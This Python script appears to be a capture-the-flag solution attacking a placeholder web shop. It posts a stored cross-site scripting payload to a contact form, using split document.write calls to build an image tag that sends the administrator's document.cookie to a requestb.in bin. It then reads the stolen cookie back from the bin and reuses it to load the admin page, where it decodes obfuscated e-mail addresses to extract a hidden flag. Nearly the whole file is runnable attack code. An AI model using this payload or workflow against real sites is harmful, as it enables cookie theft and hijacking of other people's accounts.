#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib
import json
import time
import re


#
# Variables
#

debugOrNot = False
target_hostname = 'publicservertohack.tld'
target_proto = 'http'
base_url = target_proto + '://' + target_hostname


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# requestDebug
#

def requestDebug(s, req):
  prepared = req.prepare()
  myDebug('-----------REQUEST-----------')
  myDebug(prepared.method + ' ' + prepared.url)
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in prepared.headers.items()))
  if prepared.body != None:
    myDebug('\n' + prepared.body)
  r = s.send(prepared)
  r.encoding = 'UTF-8'
  myDebug('\n-----------RESPONSE-----------')
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items()) + '\n')
  return r


#
# Main
#

s = requests.Session()
s.verify = False

headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
  'Accept-Encoding': 'none'
}


#
# GET http://publicservertohack.tld
#

req = requests.Request('GET', base_url, headers=headers)
r = requestDebug(s, req)


#
# GET http://publicservertohack.tld/contact.php
#

req = requests.Request('GET', base_url + '/contact.php', headers=headers)
r = requestDebug(s, req)


#
# Create session on requestb.in
#
# Requestbin does not expose a public instance anymore, you will have to find another solution
#

payload = ''
headers['Content-Type'] = 'application/x-www-form-urlencoded'
req = requests.Request('POST', 'https://requestb.in/api/v1/bins', headers=headers, data=payload)
r = requestDebug(s, req)
requestbin = json.loads(r.text)['name']
myDebug(requestbin)


#
# Injection
#

msg = "<body onload=\"document.write('<');document.write('im');document.write('g sr');document.write('c=https://requestb.in/" + requestbin + "?cookie=' + document.cookie + '>')\">"
payload = 'message=' + urllib.parse.quote_plus(msg)
headers['Content-Type'] = 'application/x-www-form-urlencoded'
req = requests.Request('POST', base_url + '/contact.php', headers=headers, data=payload)
r = requestDebug(s, req)
del headers['Content-Type']


#
# GET cookie
#

time.sleep(5)
req = requests.Request('GET', 'https://requestb.in/api/v1/bins/' + requestbin + '/requests', headers=headers)
r = requestDebug(s, req)
jsontext = json.loads(r.text)
adminCookie = jsontext[0]['query_string']['cookie'][0].split('=')[1]
myDebug(adminCookie)


#
# GET admin page from http://publicservertohack.tld
#

cookies = {
  'adminCookie': adminCookie
}
req = requests.Request('GET', base_url + '/', headers=headers, cookies=cookies)
r = requestDebug(s, req)


#
# GET admin page from http://publicservertohack.tld/shop_administrator.php and discover easter egg
#

cookies = {
  'adminCookie': adminCookie
}
req = requests.Request('GET', base_url + '/shop_administrator.php', headers=headers, cookies=cookies)
r = requestDebug(s, req)
a = BeautifulSoup(r.text, 'lxml').find_all('div', { 'class': 'col-md-3' })
myDebug(a[-1])
myctxs = a[-1].find_all('a', { 'class': '__cf_email__' })
e = ''
for myctx in myctxs :
  myhash = myctx.get('data-cfemail')
  r = int('0x' + myhash[0:2], 16)
  for i in range(2, len(myhash), 2):
    e += chr(int('0x' + myhash[i:i+2], 16)^r)
e += re.search('</script>([^>]*)\n</div>$', str(a[-1])).group(1)
print(e)
